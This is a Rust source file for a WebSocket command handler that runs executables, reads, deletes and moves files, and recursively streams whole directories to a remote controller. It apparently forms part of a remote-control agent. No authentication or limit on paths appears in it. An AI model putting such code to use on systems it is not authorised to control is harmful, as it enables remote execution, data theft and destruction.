use std::path::{Path, PathBuf};

use async_recursion::async_recursion;
use async_trait::async_trait;
use futures_util::SinkExt;
use tokio::fs;
use tokio_tungstenite::tungstenite::Message;

use crate::handlers::func::{Function, HandlerResult};
use crate::router::SocketWriter;

pub struct FileSystem;

#[async_trait]
impl Function for FileSystem {
    async fn handler(args: serde_json::Value, socket: &mut SocketWriter) -> HandlerResult {
        let operation = args["operation"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("'operation' field must be a string"))?;

        let path = Path::new(
            args["path"]
                .as_str()
                .ok_or_else(|| anyhow::anyhow!("Invalid 'path' argument"))?,
        );

        match operation {
            "RUN" => run_file(path, socket).await?,
            "GET" => get_path_content(path, socket).await?,
            "DEL" => delete_path(path, socket).await?,
            "MOV" => {
                let to_path: PathBuf = args["to"]
                    .as_str()
                    .ok_or_else(|| anyhow::anyhow!("Invalid 'to' path argument"))?
                    .into();
                move_object(path, &to_path, socket).await?;
            }
            "DOWN" => download_object(path, socket).await?,
            _ => return Err(anyhow::anyhow!("Unknown operation")),
        };
        Ok(())
    }
}

#[async_recursion]
async fn download_object(path: &Path, socket: &mut SocketWriter<'_>) -> anyhow::Result<()> {
    let metadata = fs::metadata(path).await?;

    if metadata.is_file() {
        let file_name = path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("unknown_file");

        let mut file_data = Vec::new();
        file_data.extend_from_slice(file_name.as_bytes());
        file_data.push(b'\n');
        let content = fs::read(path).await?;
        file_data.extend_from_slice(&content);

        socket.send(Message::Binary(file_data)).await?;
    } else if metadata.is_dir() {
        let mut entries = fs::read_dir(path).await?;
        while let Some(entry) = entries.next_entry().await? {
            if let Err(e) = download_object(&entry.path(), socket).await {
                let error_message = format!("Failed to process {}: {}", entry.path().display(), e);
                socket.send(Message::Text(error_message)).await?;
            }
        }
    }
    Ok(())
}

async fn run_file(path: &Path, socket: &mut SocketWriter<'_>) -> anyhow::Result<()> {
    match tokio::process::Command::new(path).spawn() {
        Ok(_) => {
            socket.send("OK runned".into()).await?;
            Ok(())
        }
        Err(e) => {
            let error_message = format!("NO not runned: {}", e);
            socket.send(error_message.into()).await?;
            Err(anyhow::anyhow!("Failed to run file: {}", e))
        }
    }
}

async fn get_path_content(path: &Path, socket: &mut SocketWriter<'_>) -> anyhow::Result<()> {
    let meta = fs::metadata(path).await?;
    if meta.is_file() {
        let contents = fs::read_to_string(path).await?;
        socket.send(contents.into()).await?;
    } else if meta.is_dir() {
        let mut entries = fs::read_dir(path).await?;
        let mut response_string = String::new();
        while let Some(entry) = entries.next_entry().await? {
            let file_type = if entry.file_type().await?.is_dir() {
                "Dir"
            } else {
                "File"
            };
            let file_name = entry
                .file_name()
                .into_string()
                .unwrap_or_else(|_| "unknown".to_string());
            response_string.push_str(&format!("{} ({})\n", file_name, file_type));
        }
        socket.send(response_string.into()).await?;
    }
    Ok(())
}

async fn delete_path(path: &Path, socket: &mut SocketWriter<'_>) -> anyhow::Result<()> {
    let meta = fs::metadata(path).await?;
    if meta.is_dir() {
        fs::remove_dir_all(path).await?;
    } else {
        fs::remove_file(path).await?;
    }

    let success_message = format!("OK deleted {}", path.to_str().unwrap_or("unknown"));
    socket.send(success_message.into()).await?;
    Ok(())
}

async fn move_object(from: &Path, to: &Path, socket: &mut SocketWriter<'_>) -> anyhow::Result<()> {
    match fs::rename(from, to).await {
        Ok(_) => {
            socket.send("OK moved".into()).await?;
            Ok(())
        }
        Err(e) => {
            let error_message = format!("NO not moved: {}", e);
            socket.send(error_message.into()).await?;
            Err(e.into())
        }
    }
}
